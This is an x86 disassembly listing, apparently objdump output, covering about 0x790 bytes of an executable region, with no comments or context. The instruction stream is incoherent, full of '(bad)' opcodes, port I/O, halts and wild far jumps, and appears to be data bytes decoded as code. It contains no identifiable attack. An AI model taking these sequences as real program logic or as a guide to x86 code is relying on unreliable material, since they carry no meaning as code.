  404ac4:	fdivr  QWORD PTR [ebx+0x42]
  404ac7:	mov    edx,0xc3d391d6
  404acc:	mov    eax,esi
  404ace:	pop    esi
  404acf:	jp     0x404ab8
  404ad1:	daa    
  404ad2:	ja     0x404b3d
  404ad4:	es sti 
  404ad6:	es cmc 
  404ad8:	bnd jno 0x404a7f
  404adb:	sahf   
  404adc:	call   DWORD PTR [eax]
  404ade:	push   ebp
  404adf:	enter  0xed75,0xee
  404ae3:	les    eax,FWORD PTR [ebp-0x144a2e8e]
  404ae9:	xor    edx,DWORD PTR [edi-0x23]
  404aec:	sbb    BYTE PTR [edx+0x2ee9d80d],dh
  404af2:	pop    esi
  404af3:	xchg   esi,eax
  404af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404af5:	loope  0x404ac7
  404af7:	div    BYTE PTR [ebp+0x76]
  404afa:	cli    
  404afb:	cli    
  404afc:	xor    eax,0xfae9ece1
  404b01:	jo     0x404ad1
  404b03:	inc    edx
  404b04:	out    0xf1,eax
  404b06:	or     edi,edx
  404b08:	sti    
  404b09:	jne    0x404b5f
  404b0b:	daa    
  404b0c:	xchg   esi,eax
  404b0d:	xor    eax,0xdac52b2f
  404b12:	stos   DWORD PTR es:[edi],eax
  404b13:	test   eax,0xccb307
  404b18:	mov    ecx,0x616795eb
  404b1d:	stos   BYTE PTR es:[edi],al
  404b1e:	push   edx
  404b1f:	jmp    0x404aeb
  404b21:	dec    esp
  404b22:	jge    0x404b9a
  404b24:	pop    eax
  404b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b26:	scas   al,BYTE PTR es:[edi]
  404b27:	inc    ecx
  404b28:	in     al,0x2c
  404b2a:	jp     0x404ac8
  404b2c:	xor    BYTE PTR [edx+0x6c],al
  404b2f:	mov    ebx,esp
  404b31:	xor    al,0x8d
  404b33:	hlt    
  404b34:	(bad)  [ebp-0x2b140902]
  404b3a:	out    0x42,eax
  404b3c:	mov    ebx,0xb29effa0
  404b41:	leave  
  404b42:	or     eax,0x9af8ee35
  404b47:	shl    ah,0x8
  404b4a:	ja     0x404ace
  404b4c:	sub    ah,BYTE PTR [ebp+0x1c]
  404b4f:	(bad)  
  404b50:	mov    ds,WORD PTR [ebx-0x2b]
  404b53:	call   0xa72b:0xce24cc77
  404b5a:	shr    BYTE PTR [edi+0x69],cl
  404b5d:	dec    esp
  404b5e:	jo     0x404b1b
  404b60:	jl     0x404b48
  404b62:	int3   
  404b63:	into   
  404b64:	inc    esi
  404b65:	outs   dx,BYTE PTR ds:[esi]
  404b66:	pop    ebx
  404b67:	mov    bl,BYTE PTR ds:0x213c3c15
  404b6d:	popa   
  404b6e:	bound  esp,QWORD PTR [ecx-0x2b]
  404b71:	punpckhbw mm4,mm4
  404b74:	fdivr  DWORD PTR [ecx-0x4b]
  404b77:	popa   
  404b78:	jge    0x928d6b4d
  404b7e:	xchg   ebp,eax
  404b7f:	sub    al,BYTE PTR [edi-0x3b]
  404b82:	cs pop eax
  404b84:	adc    al,0xc3
  404b86:	pop    es
  404b87:	cs ja  0x404b2f
  404b8a:	inc    edi
  404b8b:	je     0x404bc3
  404b8d:	cmp    DWORD PTR [eax+0x78f27b4f],0xffffffd0
  404b94:	xor    BYTE PTR [eax+eiz*1-0x72e9736d],dh
  404b9b:	stc    
  404b9c:	(bad)  
  404b9d:	mov    ecx,0x8089a9dc
  404ba2:	idiv   BYTE PTR [ecx-0x5a98f4c6]
  404ba8:	lock fsub QWORD PTR [ebp+0x5]
  404bac:	in     al,dx
  404bad:	ror    al,1
  404baf:	into   
  404bb0:	(bad)  
  404bb2:	fild   QWORD PTR [edx-0x6d]
  404bb5:	scas   eax,DWORD PTR es:[edi]
  404bb6:	push   0x7da6749a
  404bbb:	cld    
  404bbc:	mov    BYTE PTR [edi-0x69],0x62
  404bc0:	int3   
  404bc1:	shr    DWORD PTR [esi],0xac
  404bc4:	(bad)  
  404bc6:	xchg   DWORD PTR [edi+esi*8+0x4e2bf94f],edi
  404bcd:	xchg   edx,eax
  404bce:	js     0x404bfb
  404bd0:	inc    eax
  404bd1:	push   ebx
  404bd2:	clc    
  404bd3:	inc    edx
  404bd4:	daa    
  404bd5:	mov    ?,WORD PTR [esp+ebp*4+0x6f]
  404bd9:	dec    esp
  404bda:	inc    esp
  404bdb:	jne    0x404b90
  404bdd:	loopne 0x404c2d
  404bdf:	lods   al,BYTE PTR ds:[esi]
  404be0:	repz dec edi
  404be2:	aas    
  404be3:	jo     0x404bca
  404be5:	es mov ah,0xc1
  404be8:	(bad)  
  404be9:	cwde   
  404bea:	xor    eax,0x546ba0bd
  404bef:	(bad)  
  404bf0:	or     ecx,DWORD PTR [edx-0x2cd88b1]
  404bf6:	lea    ebp,[edx+0x210021e2]
  404bfc:	xor    eax,ebx
  404bfe:	push   0xab80cf9c
  404c03:	dec    ecx
  404c04:	mov    ss,WORD PTR [ecx]
  404c06:	clc    
  404c07:	adc    eax,0xb7006a5a
  404c0c:	add    DWORD PTR [esi-0x11],0x13845336
  404c13:	xor    eax,DWORD PTR [ecx-0x78]
  404c16:	mov    ch,0xc3
  404c18:	pushf  
  404c19:	cmc    
  404c1a:	test   eax,0xa7e471bd
  404c1f:	or     edi,esp
  404c21:	mov    gs,WORD PTR [ebx]
  404c23:	and    al,0x30
  404c25:	(bad)  
  404c26:	outs   dx,DWORD PTR ds:[esi]
  404c27:	and    eax,0x3e822269
  404c2c:	retf   0x9d93
  404c2f:	sbb    DWORD PTR [edx-0x3e857115],edx
  404c35:	push   ds
  404c36:	add    DWORD PTR [ebx-0x44],esi
  404c39:	sub    ecx,DWORD PTR [ecx-0x77]
  404c3c:	loop   0x404bca
  404c3e:	sub    eax,0xe3873071
  404c43:	js     0x404c39
  404c45:	jnp    0x404c83
  404c47:	add    eax,0x814920f9
  404c4c:	out    dx,eax
  404c4d:	jmp    0xb543:0xfc5bb7b3
  404c54:	fsub   QWORD PTR [edi]
  404c56:	mov    ah,0x76
  404c58:	xor    DWORD PTR [eax],edx
  404c5a:	aad    0xdf
  404c5c:	push   ebx
  404c5d:	in     eax,dx
  404c5e:	es mov ah,0x1
  404c61:	stos   BYTE PTR es:[edi],al
  404c62:	mov    ah,0x21
  404c64:	das    
  404c65:	test   BYTE PTR [ecx+0x3ccb46a3],bh
  404c6b:	jbe    0x404c76
  404c6d:	and    bh,ch
  404c6f:	push   esp
  404c70:	add    BYTE PTR [ecx],al
  404c72:	jl     0x404c34
  404c74:	jle    0x404c64
  404c76:	stos   DWORD PTR es:[edi],eax
  404c77:	ins    DWORD PTR es:[edi],dx
  404c78:	adc    al,0xd6
  404c7a:	push   es
  404c7b:	lods   eax,DWORD PTR ds:[esi]
  404c7c:	push   edx
  404c7d:	fs cmp ecx,ebx
  404c80:	mov    ds:0xec23cd8a,al
  404c85:	mov    edx,0x72fb9f1a
  404c8a:	ds adc edx,esi
  404c8d:	xchg   edx,eax
  404c8e:	push   ebx
  404c8f:	ret    
  404c90:	int3   
  404c91:	xchg   esp,eax
  404c92:	outs   dx,BYTE PTR ds:[esi]
  404c93:	int    0xfb
  404c95:	jo     0x404cbd
  404c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c98:	mov    bl,BYTE PTR [esi-0x4ab97965]
  404c9e:	mov    ah,0xa9
  404ca0:	retf   
  404ca1:	jns    0x404ce5
  404ca3:	int3   
  404ca4:	jns    0x404c80
  404ca6:	jmp    0xff8e2ba6
  404cab:	test   DWORD PTR [ebx+0x28001aab],esp
  404cb1:	outs   dx,BYTE PTR ds:[esi]
  404cb2:	adc    ebx,DWORD PTR [edi]
  404cb4:	enter  0xbc36,0x78
  404cb8:	aas    
  404cb9:	jecxz  0x404d37
  404cbb:	mov    esi,0x8d42a6ac
  404cc0:	arpl   ax,cx
  404cc2:	push   es
  404cc3:	mov    esp,esi
  404cc5:	or     edx,ebx
  404cc7:	sbb    DWORD PTR [edi-0x3b16d7b7],edx
  404ccd:	xor    ah,al
  404ccf:	or     ecx,ebp
  404cd1:	mov    cs,edi
  404cd3:	mov    ds:0xbf1a23ae,al
  404cd8:	call   0xd151:0xaad2b563
  404cdf:	sbb    eax,0x91fcc3d2
  404ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce5:	loopne 0x404c92
  404ce7:	xor    al,0xc7
  404ce9:	adc    BYTE PTR [ebp+0x3e],ah
  404cec:	and    BYTE PTR [edi+edi*2-0x7a],bl
  404cf0:	ja     0x404c9c
  404cf2:	(bad)  
  404cf3:	clc    
  404cf4:	loopne 0x404d36
  404cf6:	xchg   edi,eax
  404cf7:	(bad)  
  404cf8:	std    
  404cf9:	xor    eax,0x2d2b5cb5
  404cfe:	sub    dl,BYTE PTR [ebx]
  404d00:	jnp    0x404d26
  404d02:	icebp  
  404d03:	in     eax,0x90
  404d05:	ror    BYTE PTR [ecx],1
  404d07:	es and al,0x1
  404d0a:	xor    dl,BYTE PTR [esi-0x1]
  404d0d:	push   0x28151e73
  404d12:	cmp    BYTE PTR [ecx],bl
  404d14:	or     ch,dh
  404d16:	in     al,dx
  404d17:	or     al,0x5d
  404d1a:	pop    eax
  404d1b:	xchg   esi,eax
  404d1c:	out    dx,al
  404d1d:	pop    eax
  404d1e:	sub    eax,0x24cad1d9
  404d23:	or     DWORD PTR [eax+0x6d4759f4],0xef1feb0f
  404d2d:	push   ds
  404d2e:	mov    bl,0x2a
  404d30:	sbb    DWORD PTR [eax+eiz*4-0x6cc5fc85],esp
  404d37:	fld    TBYTE PTR [edx-0x3908f4c5]
  404d3d:	cmc    
  404d3e:	dec    esi
  404d3f:	push   ecx
  404d40:	(bad)  
  404d41:	fdivp  st(4),st
  404d43:	in     eax,dx
  404d44:	pop    esi
  404d45:	(bad)  
  404d46:	call   0x256d601d
  404d4b:	int    0x14
  404d4d:	inc    esi
  404d4e:	mov    dh,BYTE PTR [edx]
  404d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d51:	cmp    eax,0x6b7d8262
  404d56:	(bad)  
  404d57:	sbb    ebx,DWORD PTR [edx]
  404d59:	dec    edx
  404d5a:	add    eax,0x5b99befc
  404d5f:	cmp    al,dl
  404d61:	mov    WORD PTR [ebx-0x7],cs
  404d64:	xor    eax,0x6de6e984
  404d69:	push   ds
  404d6a:	pop    es
  404d6b:	pop    esp
  404d6c:	pop    eax
  404d6d:	imul   DWORD PTR [bp+di]
  404d70:	inc    edx
  404d71:	inc    edi
  404d72:	std    
  404d73:	push   ds
  404d74:	test   eax,0xd38f5ba9
  404d79:	pop    edi
  404d7a:	mov    ds:0x52a5a71,al
  404d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d80:	sub    bl,bh
  404d82:	sub    ch,BYTE PTR [ebp+0x4a]
  404d85:	pop    ebp
  404d86:	pop    edx
  404d87:	lds    edx,FWORD PTR [ebx-0x78]
  404d8a:	rcr    BYTE PTR [edx-0x2],0xf1
  404d8e:	mov    BYTE PTR [ebp-0x78],ah
  404d91:	call   0x9cc07c49
  404d96:	inc    esi
  404d97:	sub    al,0x83
  404d99:	js     0x404d77
  404d9b:	push   0xffffff91
  404d9d:	stos   DWORD PTR es:[edi],eax
  404d9e:	xor    ch,BYTE PTR [edi+0x6]
  404da1:	jecxz  0x404d6d
  404da3:	(bad)  
  404da4:	mov    ah,0x79
  404da6:	jecxz  0x404dc3
  404da8:	mov    ebx,esi
  404daa:	inc    edi
  404dab:	xchg   ebp,eax
  404dac:	jno    0x404dda
  404dae:	inc    ebp
  404daf:	pop    eax
  404db0:	add    BYTE PTR [edx-0x3aa1dff2],bl
  404db6:	cmc    
  404db7:	fimul  WORD PTR [ebx+0x38]
  404dba:	out    0x5b,eax
  404dbc:	xlat   BYTE PTR ds:[ebx]
  404dbd:	pushf  
  404dbe:	dec    ebx
  404dbf:	jbe    0x404d5b
  404dc1:	call   ebx
  404dc3:	test   al,0x61
  404dc5:	test   DWORD PTR [edi+ebx*4],esi
  404dc8:	arpl   WORD PTR [edi+0x5935bfca],di
  404dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcf:	jne    0x404da8
  404dd1:	idiv   DWORD PTR [esi+ebp*1]
  404dd4:	cmp    DWORD PTR [eax-0x17248d6f],0x18d82597
  404dde:	pop    esi
  404ddf:	pop    ebp
  404de0:	inc    ebx
  404de1:	retf   
  404de2:	jmp    0x4cf5:0x54919a3f
  404de9:	scas   eax,DWORD PTR es:[edi]
  404dea:	out    dx,al
  404deb:	pop    ebp
  404dec:	test   al,0x32
  404dee:	into   
  404def:	xor    BYTE PTR [edx+0x43],ch
  404df2:	xchg   ebx,eax
  404df3:	test   DWORD PTR [eax+0x134a0d40],esi
  404df9:	iret   
  404dfa:	adc    edi,edx
  404dfc:	mov    edx,0xa1d6f509
  404e01:	push   0xfc43bf38
  404e06:	push   ds
  404e07:	setnp  BYTE PTR [ecx]
  404e0a:	loopne 0x404d99
  404e0c:	outs   dx,BYTE PTR ds:[esi]
  404e0d:	pop    ecx
  404e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0f:	pop    esi
  404e10:	mov    esi,0x233c479f
  404e15:	mov    esp,0x69c5b067
  404e1a:	push   esi
  404e1b:	stc    
  404e1c:	out    dx,eax
  404e1d:	dec    ebp
  404e1e:	add    esp,DWORD PTR [ecx]
  404e20:	xor    al,0xb
  404e22:	nop
  404e23:	pusha  
  404e24:	xchg   ebp,eax
  404e25:	and    al,0x3b
  404e27:	adc    edx,DWORD PTR [edi+0x2de7a9d1]
  404e2d:	sbb    ah,ah
  404e2f:	dec    esi
  404e30:	cld    
  404e31:	loopne 0x404e9f
  404e33:	test   eax,0x7ae971fd
  404e38:	scas   eax,DWORD PTR es:[edi]
  404e39:	pop    esp
  404e3a:	aas    
  404e3b:	xlat   BYTE PTR ds:[ebx]
  404e3c:	sbb    eax,0xdcc00475
  404e41:	push   ss
  404e42:	pop    ss
  404e43:	loopne 0x404dfc
  404e45:	inc    eax
  404e46:	inc    edx
  404e47:	jmp    0x7226f5bd
  404e4c:	out    dx,eax
  404e4d:	aam    0x34
  404e4f:	push   ss
  404e50:	xchg   ebx,eax
  404e51:	test   eax,0x7d15137a
  404e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e57:	add    al,0xa
  404e59:	in     eax,dx
  404e5a:	push   eax
  404e5b:	fdivrp st(7),st
  404e5d:	std    
  404e5e:	outs   dx,DWORD PTR ds:[esi]
  404e5f:	push   es
  404e60:	popa   
  404e61:	rcr    BYTE PTR [ebp+0x61745a74],1
  404e67:	jne    0x404e65
  404e69:	call   0x9b0:0x90ffaa3b
  404e70:	pop    ebx
  404e71:	jne    0x404e38
  404e73:	repz imul ebx,eax,0x68
  404e77:	mov    esp,es
  404e79:	mov    dh,0xe5
  404e7b:	in     al,0xd5
  404e7d:	jo     0x404eb5
  404e7f:	lods   eax,DWORD PTR ds:[esi]
  404e80:	scas   eax,DWORD PTR es:[edi]
  404e81:	ds inc esp
  404e83:	mov    esp,0x71ea394a
  404e88:	fld    DWORD PTR [ecx]
  404e8a:	fwait
  404e8b:	iret   
  404e8c:	pop    ebx
  404e8d:	mov    al,0x75
  404e8f:	rol    BYTE PTR [edi+0x2fc9a311],1
  404e95:	add    esi,eax
  404e97:	mov    ebx,DWORD PTR [eax+eiz*4-0x12d0b6c1]
  404e9e:	dec    esi
  404e9f:	xchg   ecx,eax
  404ea0:	sbb    BYTE PTR [edx-0x6902bc6e],0xb0
  404ea7:	js     0x404f18
  404ea9:	mov    al,ds:0xae88e4a6
  404eae:	out    dx,al
  404eaf:	aas    
  404eb0:	jg     0x404e98
  404eb2:	sbb    eax,0xcdebeca8
  404eb7:	and    bl,BYTE PTR [edx]
  404eb9:	div    BYTE PTR [edx+0x288fd544]
  404ebf:	retf   0x8dad
  404ec2:	or     al,BYTE PTR [edx+0x7f]
  404ec5:	xchg   DWORD PTR [edx],eax
  404ec7:	in     al,dx
  404ec8:	adc    eax,0xfce807af
  404ecd:	cmp    DWORD PTR [edx-0x38],eax
  404ed0:	bnd jb 0x404ef3
  404ed3:	adc    cl,bl
  404ed5:	jbe    0x404f0d
  404ed7:	mov    bh,0xf1
  404ed9:	cmp    al,0x4
  404edb:	in     al,0xb7
  404edd:	mov    ch,0x1d
  404edf:	jnp    0x404e78
  404ee1:	xchg   edx,eax
  404ee2:	out    dx,al
  404ee3:	idiv   DWORD PTR [ebp+0x3f]
  404ee6:	(bad)  
  404ee7:	jno    0x404f17
  404ee9:	or     BYTE PTR cs:[esi-0x475984db],cl
  404ef0:	in     al,dx
  404ef1:	in     eax,dx
  404ef2:	xor    al,0x5a
  404ef4:	xchg   al,ah
  404ef6:	sbb    dl,dl
  404ef8:	xor    ch,BYTE PTR [edx+0x1f]
  404efb:	xchg   ecx,esp
  404efd:	rcr    ah,0x51
  404f00:	mov    al,0x80
  404f02:	dec    edx
  404f03:	and    BYTE PTR [edx],dh
  404f05:	or     DWORD PTR [edi-0x4a],0x7f7057c0
  404f0c:	jle    0x404f37
  404f0e:	bound  eax,QWORD PTR [ebp-0x307a38f3]
  404f14:	out    0x3a,al
  404f16:	xlat   BYTE PTR ds:[ebx]
  404f17:	ds dec ebx
  404f19:	ficom  DWORD PTR [ecx+0x3a]
  404f1c:	xchg   ebp,eax
  404f1d:	xchg   ebp,eax
  404f1e:	pop    eax
  404f1f:	adc    BYTE PTR ds:0xf968cecf,bl
  404f25:	sbb    ebp,DWORD PTR [edi+0x31d2f493]
  404f2b:	sub    eax,0xfaf80267
  404f30:	xchg   esi,eax
  404f31:	inc    ecx
  404f32:	add    DWORD PTR ds:0xda072297,ebx
  404f38:	push   edx
  404f39:	js     0x404f3b
  404f3b:	adc    al,dh
  404f3d:	and    DWORD PTR [ecx+esi*4+0x226be3db],esp
  404f44:	mov    edx,0xa8eaa3f6
  404f49:	mov    ecx,0xa4924d41
  404f4e:	pop    ebp
  404f4f:	adc    eax,0x139eeee5
  404f54:	adc    al,0xfd
  404f56:	fdivr  DWORD PTR [esi+0x7bed6c58]
  404f5c:	daa    
  404f5d:	sbb    ebx,DWORD PTR [esi-0x3490d2dd]
  404f63:	push   0x8510c588
  404f68:	fcom   DWORD PTR [ebp+esi*1+0x6b]
  404f6c:	fldenv ds:0x4867604
  404f72:	xchg   esi,eax
  404f73:	arpl   WORD PTR [edx],bp
  404f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f76:	fist   WORD PTR [edi]
  404f78:	sbb    ah,BYTE PTR [ebx+0x30b35aa5]
  404f7e:	call   0xc6720af7
  404f83:	inc    ebp
  404f84:	cmp    eax,0x659ec557
  404f89:	push   ebx
  404f8a:	xor    eax,0x69eb0ab3
  404f8f:	bswap  eax
  404f91:	mov    WORD PTR [esi],es
  404f93:	aaa    
  404f94:	es mov esp,0x83e174f0
  404f9a:	out    dx,eax
  404f9b:	fsubr  QWORD PTR [esi+0x174f7922]
  404fa1:	mov    al,0xc0
  404fa3:	jmp    0x404fa1
  404fa5:	fimul  DWORD PTR [edx]
  404fa7:	cmc    
  404fa8:	or     ch,dh
  404faa:	inc    eax
  404fab:	cdq    
  404fac:	jp     0x404f6f
  404fae:	pop    esi
  404faf:	jns    0x405030
  404fb1:	inc    ebx
  404fb2:	mov    ecx,0x27d4a082
  404fb7:	int    0xbf
  404fb9:	xchg   ecx,eax
  404fba:	dec    eax
  404fbb:	out    dx,al
  404fbc:	int3   
  404fbd:	jae    0x404ffe
  404fbf:	jae    0x404ffc
  404fc1:	push   ss
  404fc2:	sub    esi,DWORD PTR [ebx+0x5]
  404fc5:	pop    ds
  404fc6:	pop    es
  404fc7:	cld    
  404fc8:	hlt    
  404fc9:	adc    eax,DWORD PTR [ecx-0x5e]
  404fcc:	or     BYTE PTR [edx-0xa],dh
  404fcf:	loope  0x404f86
  404fd1:	(bad)  
  404fd2:	sub    al,0x6e
  404fd4:	inc    ecx
  404fd5:	out    0x97,eax
  404fd7:	or     dh,BYTE PTR ds:0xfc791ab0
  404fdd:	inc    esp
  404fde:	std    
  404fdf:	or     BYTE PTR [esi+ebp*8-0x7691883],0x7f
  404fe7:	arpl   WORD PTR [edx+ebx*8+0xa85c2bb],si
  404fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fef:	adc    BYTE PTR [esi],0xf3
  404ff2:	mov    ch,0xca
  404ff4:	push   ebp
  404ff5:	pop    edi
  404ff6:	adc    BYTE PTR gs:[ebx],0x70
  404ffa:	fadd   DWORD PTR [ebx-0x6795a188]
  405000:	jno    0x405024
  405002:	fwait
  405003:	cwde   
  405004:	pop    edi
  405005:	sbb    DWORD PTR [eax+0x1c857d36],edx
  40500b:	cli    
  40500c:	xchg   edx,eax
  40500d:	sub    esp,DWORD PTR [esp+edi*8]
  405010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405011:	push   eax
  405012:	push   ebp
  405013:	inc    eax
  405014:	sbb    al,0xca
  405016:	aad    0x3a
  405018:	mov    ds:0x175ff48b,al
  40501d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501e:	test   eax,0x4d2c6b72
  405023:	jns    0x405084
  405025:	ret    0xa10d
  405028:	adc    ch,BYTE PTR [ecx+eiz*2+0x2e]
  40502c:	push   ecx
  40502d:	mov    esi,0x54d4d0d9
  405032:	dec    ebp
  405033:	inc    edx
  405034:	shr    BYTE PTR [edi+0x70],1
  405037:	int    0xe6
  405039:	push   0xfffffff2
  40503b:	hlt    
  40503c:	adc    al,0xc9
  40503e:	lea    ebp,[eax+0x43778f50]
  405044:	mov    eax,ds:0xbb908fea
  405049:	out    dx,al
  40504a:	sub    al,0xe8
  40504c:	jl     0x405017
  40504e:	xor    DWORD PTR [edi],esp
  405050:	dec    esp
  405051:	loope  0x40506f
  405053:	xor    DWORD PTR [edi+0x6],ebx
  405056:	ja     0x40501a
  405058:	sub    BYTE PTR [ebp-0x7a],cl
  40505b:	lods   al,BYTE PTR ds:[esi]
  40505c:	dec    esp
  40505d:	loop   0x4050a6
  40505f:	xor    ebp,esi
  405061:	imul   edi,DWORD PTR [ecx+0x72],0x3a083de1
  405068:	dec    esi
  405069:	mov    bh,0xd9
  40506b:	mov    al,0xa
  40506d:	push   eax
  40506e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40506f:	in     eax,dx
  405070:	daa    
  405071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405072:	mov    esi,cs
  405074:	pop    esi
  405075:	rcl    ebp,cl
  405077:	outs   dx,BYTE PTR ds:[esi]
  405078:	scas   al,BYTE PTR es:[edi]
  405079:	mov    dl,0x6f
  40507b:	inc    ebp
  40507c:	mov    eax,ds:0x796884f3
  405081:	and    edi,edx
  405083:	sahf   
  405084:	or     esi,DWORD PTR [ecx]
  405086:	aad    0xf8
  405088:	retf   0x6721
  40508b:	mov    BYTE PTR [edx+0x25],al
  40508e:	retf   0xd464
  405091:	push   0xc6a30b47
  405096:	mov    edx,0x8b778a13
  40509b:	mov    al,ds:0x547cf515
  4050a0:	lahf   
  4050a1:	(bad)  
  4050a2:	or     al,0x1e
  4050a4:	fidivr WORD PTR [ecx-0x49]
  4050a7:	mov    cl,BYTE PTR [ecx]
  4050a9:	out    dx,eax
  4050aa:	xchg   ebx,eax
  4050ab:	in     al,dx
  4050ac:	enter  0xa2b2,0x5a
  4050b0:	pop    ebp
  4050b1:	test   DWORD PTR [edx],eax
  4050b3:	mov    edi,0x8c9814f8
  4050b8:	imul   esi,ecx,0xbdb82265
  4050be:	hlt    
  4050bf:	gs cdq 
  4050c1:	mov    ebp,0xf72c6bfa
  4050c6:	push   esp
  4050c7:	cmc    
  4050c8:	push   ebx
  4050c9:	in     al,0xd6
  4050cb:	call   0x2196:0xe4c5bc33
  4050d2:	kxnorw k5,k0,k7
  4050d6:	out    0x46,eax
  4050d8:	aaa    
  4050d9:	mov    ebp,0x2ac3105f
  4050de:	stos   BYTE PTR es:[edi],al
  4050df:	mov    ebp,0xc1f7635a
  4050e4:	into   
  4050e5:	retf   0x5cb8
  4050e8:	mov    ecx,0x99b79774
  4050ed:	pop    ebx
  4050ee:	adc    eax,0x3b5009d4
  4050f3:	pop    edi
  4050f4:	shl    DWORD PTR [edx+0x67],cl
  4050f7:	enter  0x55ae,0x1
  4050fb:	cmp    BYTE PTR [ecx],cl
  4050fd:	fstp   QWORD PTR [ebx+0x3634399a]
  405103:	cli    
  405104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405105:	nop
  405106:	sahf   
  405107:	pop    esi
  405108:	leave  
  405109:	loope  0x40510e
  40510b:	fwait
  40510c:	mov    WORD PTR [esi+0x37],?
  40510f:	mov    al,ds:0x3f1f2a5d
  405114:	outs   dx,DWORD PTR ds:[esi]
  405115:	adc    dh,bl
  405117:	push   eax
  405118:	pop    ss
  405119:	dec    eax
  40511b:	js     0x405128
  40511d:	xor    ebx,DWORD PTR [esp+edx*1]
  405120:	int3   
  405121:	ss mov ecx,0x43405a68
  405127:	sbb    esi,DWORD PTR [esi-0x29]
  40512a:	shl    dh,1
  40512c:	ret    
  40512d:	xor    eax,0xdc7fdd89
  405132:	fcmovu st,st(6)
  405134:	sub    edx,edi
  405136:	daa    
  405137:	addr16 mov edx,0x986788d8
  40513d:	in     al,0xfe
  40513f:	or     al,BYTE PTR [edx+0x11]
  405142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405143:	inc    edx
  405144:	arpl   WORD PTR [ebx+eax*1+0xd],ax
  405148:	popa   
  405149:	cmp    al,0x59
  40514b:	sbb    eax,DWORD PTR [si]
  40514e:	sbb    eax,0x2a47dece
  405153:	adc    BYTE PTR [ebx],dl
  405155:	cmp    DWORD PTR [edx-0x32907c52],esp
  40515b:	rcl    DWORD PTR [eax],1
  40515d:	fs retf 0xc8e7
  405161:	js     0x4051de
  405163:	jmp    0x40518b
  405165:	inc    ecx
  405166:	(bad)  
  405167:	mov    ds:0xaa5f7123,al
  40516c:	je     0x40511c
  40516e:	xlat   BYTE PTR ds:[ebx]
  40516f:	inc    ebx
  405170:	aad    0x57
  405172:	pop    ecx
  405173:	das    
  405174:	pop    ebx
  405175:	imul   eax,edi,0xfffffff7
  405178:	push   ss
  405179:	ja     0x405196
  40517b:	sbb    BYTE PTR [ecx+0x3],cl
  40517e:	idiv   BYTE PTR [eax+0x256f2334]
  405184:	push   edx
  405185:	cmp    BYTE PTR [ebx],cl
  405187:	xchg   edi,eax
  405188:	dec    eax
  405189:	adc    edi,0x35
  40518c:	jb     0x4051ba
  40518e:	sub    BYTE PTR [eax-0x37],dh
  405191:	jmp    0xc308917a
  405196:	pop    edx
  405197:	pop    edx
  405198:	pop    ecx
  405199:	add    DWORD PTR [ebp+0x43],esi
  40519c:	into   
  40519d:	jno    0x4051bf
  40519f:	iret   
  4051a0:	xchg   ecx,eax
  4051a1:	mov    ebp,0x40446324
  4051a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051a7:	mov    ds:0x21c1a7b9,eax
  4051ac:	ror    DWORD PTR [ebx],0x96
  4051af:	div    esi
  4051b1:	icebp  
  4051b2:	fs arpl bp,sp
  4051b5:	aaa    
  4051b6:	in     eax,dx
  4051b7:	fwait
  4051b8:	push   0xcbaeb77e
  4051bd:	or     al,0x2f
  4051bf:	add    DWORD PTR [ecx-0x19bdb568],ebp
  4051c5:	xor    BYTE PTR [ebx+0x2f3af10d],ah
  4051cb:	add    edx,ebp
  4051cd:	cmp    DWORD PTR [esi-0x1d27b049],ecx
  4051d3:	mov    cl,BYTE PTR [ecx+eax*2]
  4051d6:	push   esp
  4051d7:	fld    TBYTE PTR [ecx-0xc]
  4051da:	add    ecx,DWORD PTR ds:0xec182301
  4051e0:	and    al,0x37
  4051e2:	shr    BYTE PTR [ecx+edi*1+0x61],cl
  4051e6:	repnz fisubr WORD PTR [edi-0x2c]
  4051ea:	push   edi
  4051eb:	mov    esi,ss
  4051ed:	cwde   
  4051ee:	gs test edi,esi
  4051f1:	pop    esi
  4051f2:	push   edx
  4051f3:	cmp    al,0x7a
  4051f5:	sti    
  4051f6:	call   0x23a5a265
  4051fb:	or     bl,BYTE PTR [edx+0x50ff2c21]
  405201:	das    
  405202:	sub    ebp,DWORD PTR [edi-0x61]
  405205:	push   esp
  405206:	cmp    ebx,esi
  405208:	jl     0x405286
  40520a:	mov    al,0x35
  40520c:	jbe    0x405229
  40520e:	mov    dh,0xb2
  405210:	mov    cl,0x5
  405212:	call   0x5ae4878
  405217:	loopne 0x405271
  405219:	stc    
  40521a:	ins    BYTE PTR es:[edi],dx
  40521b:	sbb    al,0x4d
  40521d:	fucomi st,st(2)
  40521f:	pop    ss
  405220:	xor    al,0x7e
  405222:	jno    0x4051d4
  405224:	mov    dl,0x22
  405226:	inc    edx
  405227:	push   0xffffffbf
  405229:	ficomp WORD PTR [esi-0x5d]
  40522c:	les    esp,FWORD PTR [ebx]
  40522e:	or     esp,esp
  405230:	stc    
  405231:	sub    al,0x98
  405233:	std    
  405234:	das    
  405235:	inc    esp
  405236:	dec    edi
  405237:	fist   DWORD PTR [esi-0x15]
  40523a:	ins    DWORD PTR es:[edi],dx
  40523b:	jmp    0x4ca03e9d
  405240:	loop   0x405233
  405242:	repz and ecx,0x44
  405246:	popf   
  405247:	dec    eax
  405248:	inc    esi
  405249:	xor    BYTE PTR [edi+ebx*2],cl
  40524c:	mov    esi,DWORD PTR [ebp+0xd1f50d1]
  405252:	sbb    BYTE PTR ds:0x12578d43,cl
  405258:	push   esi
  405259:	repnz pop ds
  40525b:	clc    
  40525c:	push   ds
